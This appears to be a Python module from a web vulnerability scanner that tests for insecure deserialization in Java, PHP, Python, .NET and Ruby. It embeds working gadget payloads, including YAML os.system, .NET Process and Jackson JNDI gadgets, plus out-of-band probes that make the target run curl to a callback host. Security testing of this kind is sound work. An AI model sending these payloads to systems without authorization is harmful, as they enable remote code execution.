"""
Insecure Deserialization Scanner — CWE-502.

Detects insecure deserialization in:
  - Java (ObjectInputStream, Commons Collections gadgets, ysoserial)
  - PHP (unserialize, POP chains)
  - Python (pickle, PyYAML)
  - .NET (BinaryFormatter, TypeNameHandling)
  - Ruby (Marshal.load)

Detection strategy:
  1. Error-based: Send malformed serialized objects, detect error patterns
  2. Header inspection: Check for serialized data in cookies/headers
  3. Content-Type probing: Send Java serialized objects, check for deserialization errors
  4. Time-based: Gadget chains that cause delays
  5. OOB: Gadget chains that trigger DNS/HTTP callbacks
"""

import base64
import re
import time
from urllib.parse import urljoin

from secprobe.config import Severity
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


# Java serialized magic bytes: AC ED 00 05
JAVA_MAGIC = b'\xac\xed\x00\x05'

# Error patterns that indicate deserialization processing
DESER_ERROR_PATTERNS = {
    "java": [
        re.compile(r"java\.io\.(?:ObjectInputStream|InvalidClassException|StreamCorruptedException)", re.IGNORECASE),
        re.compile(r"java\.lang\.ClassNotFoundException", re.IGNORECASE),
        re.compile(r"java\.lang\.ClassCastException", re.IGNORECASE),
        re.compile(r"org\.apache\.commons\.collections", re.IGNORECASE),
        re.compile(r"com\.sun\.org\.apache\.xalan", re.IGNORECASE),
        re.compile(r"java\.io\.Serializable", re.IGNORECASE),
        re.compile(r"Expecting serialized object", re.IGNORECASE),
        re.compile(r"cannot deserialize", re.IGNORECASE),
        re.compile(r"UnmarshalException", re.IGNORECASE),
        re.compile(r"ClassInfo\.getClassInfo", re.IGNORECASE),
        re.compile(r"com\.fasterxml\.jackson\.databind", re.IGNORECASE),
    ],
    "php": [
        re.compile(r"unserialize\(\)", re.IGNORECASE),
        re.compile(r"Error at offset \d+ of \d+ bytes", re.IGNORECASE),
        re.compile(r"allowed classes", re.IGNORECASE),
        re.compile(r"__wakeup\(\)", re.IGNORECASE),
        re.compile(r"__destruct\(\)", re.IGNORECASE),
        re.compile(r"O:\d+:\"[^\"]+\"", re.IGNORECASE),  # PHP serialized object
    ],
    "python": [
        re.compile(r"pickle\.(?:loads|load|Unpickler)", re.IGNORECASE),
        re.compile(r"_pickle\.UnpicklingError", re.IGNORECASE),
        re.compile(r"yaml\.(?:load|unsafe_load|FullLoader)", re.IGNORECASE),
        re.compile(r"copyreg\._reconstructor", re.IGNORECASE),
    ],
    "dotnet": [
        re.compile(r"System\.Runtime\.Serialization", re.IGNORECASE),
        re.compile(r"BinaryFormatter", re.IGNORECASE),
        re.compile(r"TypeNameHandling", re.IGNORECASE),
        re.compile(r"ObjectDataProvider", re.IGNORECASE),
        re.compile(r"System\.Windows\.Data", re.IGNORECASE),
        re.compile(r"JsonSerializationException", re.IGNORECASE),
        re.compile(r"SerializationException", re.IGNORECASE),
    ],
    "ruby": [
        re.compile(r"Marshal\.load", re.IGNORECASE),
        re.compile(r"TypeError.*marshal", re.IGNORECASE),
        re.compile(r"incompatible marshal file format", re.IGNORECASE),
    ],
}

# Malformed payloads to trigger error responses
ERROR_PROBES = {
    "java_corrupted": base64.b64encode(JAVA_MAGIC + b'\x73\x72\x00\x01A').decode(),
    "php_object": 'O:8:"stdClass":0:{}',
    "php_malformed": 'O:99:"NonExistentClass":1:{s:4:"test";s:4:"test";}',
    "python_pickle": base64.b64encode(b'\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00\x8c\x01A.').decode(),
    "dotnet_bf": base64.b64encode(b'\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00').decode(),
    "yaml_tag": "!!python/object/new:os.system ['echo SECPROBE']",
    "json_type": '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}',
}

# Gadget chain payloads (safe versions that don't cause harm)
GADGET_PAYLOADS = {
    "java_dns": {
        # CommonsCollections1-like payload → triggers URL.hashCode() → DNS lookup
        "desc": "Java Commons Collections DNS lookup",
        "needs_oob": True,
    },
    "php_destruct_timing": {
        "payload": 'O:8:"stdClass":99:{' + 's:1:"a";' * 99 + '}',
        "desc": "PHP deep object graph (timing)",
    },
}


class DeserializationScanner(SmartScanner):
    name = "Deserialization Scanner"
    description = "Test for insecure deserialization (CWE-502)"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing deserialization on {url}", "progress")

        try:
            baseline = self.http_client.get(url)
        except Exception as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        baseline_text = baseline.text
        vulns_found = 0

        # ── Phase 1: Cookie inspection ───────────────────────────────
        print_status("Phase 1: Inspecting cookies for serialized data", "progress")
        vulns_found += self._check_cookies(url, baseline)

        # ── Phase 2: Error-based probing ─────────────────────────────
        print_status("Phase 2: Error-based deserialization probing", "progress")
        vulns_found += self._test_error_based(url, baseline_text)

        # ── Phase 3: Content-Type probing ────────────────────────────
        print_status("Phase 3: Content-Type deserialization probing", "progress")
        vulns_found += self._test_content_types(url, baseline_text)

        # ── Phase 4: JSON deserialization ────────────────────────────
        print_status("Phase 4: JSON deserialization testing", "progress")
        vulns_found += self._test_json_deser(url, baseline_text)

        # ── Phase 5: OOB gadget chains ───────────────────────────────
        if self.oob_available:
            print_status("Phase 5: OOB deserialization testing", "progress")
            vulns_found += self._test_oob_deser(url)

        if vulns_found == 0:
            print_status("No deserialization vulnerabilities detected.", "success")
            self.add_finding(
                title="No deserialization issues detected",
                severity=Severity.INFO,
                description="Automated tests did not detect insecure deserialization.",
                category="Deserialization",
            )

    def _check_cookies(self, url, resp):
        """Check cookies for Java/PHP/Python serialized data."""
        vulns = 0
        for name, value in resp.cookies.items():
            # Java serialized (base64)
            try:
                decoded = base64.b64decode(value)
                if decoded[:4] == JAVA_MAGIC:
                    vulns += 1
                    self.add_finding(
                        title=f"Java serialized object in cookie '{name}'",
                        severity=Severity.HIGH,
                        description=(
                            f"Cookie '{name}' contains a Java serialized object "
                            f"(magic bytes AC ED 00 05). This is a deserialization attack vector."
                        ),
                        recommendation="Never deserialize untrusted data. Use JSON or protocol buffers instead.",
                        evidence=f"Cookie: {name}\nFirst bytes: {decoded[:20].hex()}",
                        category="Deserialization", url=url, cwe="CWE-502",
                    )
                    print_finding(Severity.HIGH, f"Java serialized cookie: {name}")
            except Exception:
                pass

            # PHP serialized
            if re.match(r'^[OasiNbd]:\d+', value):
                vulns += 1
                self.add_finding(
                    title=f"PHP serialized data in cookie '{name}'",
                    severity=Severity.HIGH,
                    description=f"Cookie '{name}' contains PHP serialized data.",
                    recommendation="Use JSON instead of serialize(). Set allowed_classes in unserialize().",
                    evidence=f"Cookie: {name}\nValue: {value[:100]}",
                    category="Deserialization", url=url, cwe="CWE-502",
                )
                print_finding(Severity.HIGH, f"PHP serialized cookie: {name}")

            # Python pickle (base64)
            try:
                decoded = base64.b64decode(value)
                if decoded[:2] in (b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05'):
                    vulns += 1
                    self.add_finding(
                        title=f"Python pickle in cookie '{name}'",
                        severity=Severity.CRITICAL,
                        description=f"Cookie '{name}' appears to contain Python pickle data.",
                        recommendation="Never use pickle for untrusted data. Use JSON or msgpack.",
                        evidence=f"Cookie: {name}",
                        category="Deserialization", url=url, cwe="CWE-502",
                    )
            except Exception:
                pass

            # Base64-encoded JSON with $type (Newtonsoft.Json TypeNameHandling)
            try:
                decoded = base64.b64decode(value).decode("utf-8", errors="ignore")
                if '"$type"' in decoded:
                    vulns += 1
                    self.add_finding(
                        title=f".NET TypeNameHandling in cookie '{name}'",
                        severity=Severity.HIGH,
                        description=f"Cookie '{name}' contains JSON with $type discriminator.",
                        recommendation="Set TypeNameHandling.None in Newtonsoft.Json.",
                        evidence=f"Cookie: {name}\nDecoded: {decoded[:100]}",
                        category="Deserialization", url=url, cwe="CWE-502",
                    )
            except Exception:
                pass

        return vulns

    def _test_error_based(self, url, baseline_text):
        """Send malformed serialized objects to elicit error responses."""
        vulns = 0

        # POST body probes
        for probe_name, probe_data in ERROR_PROBES.items():
            if self.config.rate_limit:
                time.sleep(self.config.rate_limit)

            content_types = ["application/octet-stream", "application/x-java-serialized-object",
                             "application/json", "text/plain"]
            if "php" in probe_name:
                content_types = ["application/x-www-form-urlencoded", "text/plain"]
            elif "yaml" in probe_name:
                content_types = ["application/x-yaml", "text/yaml", "text/plain"]
            elif "json" in probe_name:
                content_types = ["application/json"]

            for ct in content_types[:2]:
                try:
                    resp = self.http_client.post(
                        url, data=probe_data, headers={"Content-Type": ct}, timeout=10)
                except Exception:
                    continue

                # Check for deserialization error patterns NOT in baseline
                for platform, patterns in DESER_ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if pattern.search(resp.text) and not pattern.search(baseline_text):
                            vulns += 1
                            self.add_finding(
                                title=f"Deserialization error detected ({platform})",
                                severity=Severity.HIGH,
                                description=(
                                    f"Server processes {platform} serialized data and leaked an error.\n"
                                    f"Probe: {probe_name}\n"
                                    f"Error: {pattern.pattern}"
                                ),
                                recommendation=f"Disable {platform} deserialization of untrusted data.",
                                evidence=f"URL: {url}\nContent-Type: {ct}\nProbe: {probe_name}",
                                category="Deserialization", url=url, cwe="CWE-502",
                            )
                            print_finding(Severity.HIGH, f"Deser error: {platform} ({probe_name})")
                            break
                    else:
                        continue
                    break

        return vulns

    def _test_content_types(self, url, baseline_text):
        """Test Content-Type switching to trigger deserialization."""
        vulns = 0

        # Send Java serialized stream
        java_payload = JAVA_MAGIC + b'\x73\x72\x00\x15java.rmi.ServerError'
        try:
            resp = self.http_client.post(
                url, data=java_payload,
                headers={"Content-Type": "application/x-java-serialized-object"}, timeout=10)
            for pattern in DESER_ERROR_PATTERNS["java"]:
                if pattern.search(resp.text) and not pattern.search(baseline_text):
                    vulns += 1
                    self.add_finding(
                        title="Java deserialization endpoint detected",
                        severity=Severity.CRITICAL,
                        description="Server processes Java serialized objects via Content-Type switching.",
                        recommendation="Remove Java deserialization endpoints. Use JSON APIs.",
                        evidence=f"URL: {url}\nError: {pattern.pattern}",
                        category="Deserialization", url=url, cwe="CWE-502",
                    )
                    break
        except Exception:
            pass

        # Send .NET BinaryFormatter data
        dotnet_payload = b'\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00'
        try:
            resp = self.http_client.post(
                url, data=dotnet_payload,
                headers={"Content-Type": "application/octet-stream"}, timeout=10)
            for pattern in DESER_ERROR_PATTERNS["dotnet"]:
                if pattern.search(resp.text) and not pattern.search(baseline_text):
                    vulns += 1
                    self.add_finding(
                        title=".NET deserialization endpoint detected",
                        severity=Severity.CRITICAL,
                        description="Server processes .NET serialized objects.",
                        recommendation="Use DataContractSerializer instead of BinaryFormatter.",
                        evidence=f"URL: {url}",
                        category="Deserialization", url=url, cwe="CWE-502",
                    )
                    break
        except Exception:
            pass

        return vulns

    def _test_json_deser(self, url, baseline_text):
        """Test JSON deserialization with type discriminators."""
        vulns = 0

        # Newtonsoft.Json TypeNameHandling attack
        type_payloads = [
            '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}',
            '{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd"}}',
            '{"__type":"System.Configuration.Install.AssemblyInstaller"}',
        ]
        for payload in type_payloads:
            try:
                resp = self.http_client.post(
                    url, data=payload,
                    headers={"Content-Type": "application/json"}, timeout=10)
                for platform in ("dotnet", "java"):
                    for pattern in DESER_ERROR_PATTERNS[platform]:
                        if pattern.search(resp.text) and not pattern.search(baseline_text):
                            vulns += 1
                            self.add_finding(
                                title=f"JSON type confusion ({platform})",
                                severity=Severity.CRITICAL,
                                description=f"Server processes $type discriminators in JSON input.",
                                recommendation="Disable TypeNameHandling or polymorphic deserialization.",
                                evidence=f"URL: {url}\nPayload: {payload[:80]}",
                                category="Deserialization", url=url, cwe="CWE-502",
                            )
                            break
                    else:
                        continue
                    break
            except Exception:
                continue

        # Jackson polymorphic deserialization
        jackson_payloads = [
            '["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"_bytecodes":["AAAA"],"_name":"a"}]',
            '{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/test"}',
        ]
        for payload in jackson_payloads:
            try:
                resp = self.http_client.post(
                    url, data=payload,
                    headers={"Content-Type": "application/json"}, timeout=10)
                for pattern in DESER_ERROR_PATTERNS["java"]:
                    if pattern.search(resp.text) and not pattern.search(baseline_text):
                        vulns += 1
                        self.add_finding(
                            title="Jackson polymorphic deserialization detected",
                            severity=Severity.CRITICAL,
                            description="Server processes Jackson polymorphic type info in JSON.",
                            recommendation="Disable DefaultTyping in Jackson. Use @JsonTypeInfo with allowlists.",
                            evidence=f"URL: {url}\nPayload: {payload[:80]}",
                            category="Deserialization", url=url, cwe="CWE-502",
                        )
                        break
            except Exception:
                continue

        return vulns

    def _test_oob_deser(self, url):
        """Test deserialization with OOB callback payloads."""
        if not self.oob_available:
            return 0

        oob_count = 0

        # Java JNDI injection via JSON
        token = self.oob_generate_token(url, "json_body", "rce_blind", "java_jndi")
        cb_url = self.oob_get_url(token)
        payloads = [
            f'{{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{self.oob_server.callback_host}:{self.oob_server.http_port}/callback/{token}","autoCommit":true}}',
            f'{{"$type":"System.Windows.Data.ObjectDataProvider","ObjectInstance":{{"$type":"System.Diagnostics.Process","StartInfo":{{"FileName":"curl","Arguments":"{cb_url}"}}}}}}',
        ]
        for payload in payloads:
            try:
                self.http_client.post(
                    url, data=payload,
                    headers={"Content-Type": "application/json"}, timeout=10)
                oob_count += 1
            except Exception:
                pass

        # PHP POP chain with OOB
        token = self.oob_generate_token(url, "body", "rce_blind", "php_pop")
        cb_url = self.oob_get_url(token)
        php_payload = f'O:8:"GuzzleHttp\\Psr7\\FnStream":2:{{s:33:"GuzzleHttp\\Psr7\\Fn_close";s:{len("system")}:"system";s:3:"fn_";s:{len("curl " + cb_url)}:"curl {cb_url}";}}'
        try:
            self.http_client.post(url, data=php_payload, timeout=10)
            oob_count += 1
        except Exception:
            pass

        if oob_count:
            print_status(f"Sent {oob_count} OOB deser payloads, waiting...", "progress")
            return self.oob_collect_findings(wait_seconds=10)
        return 0
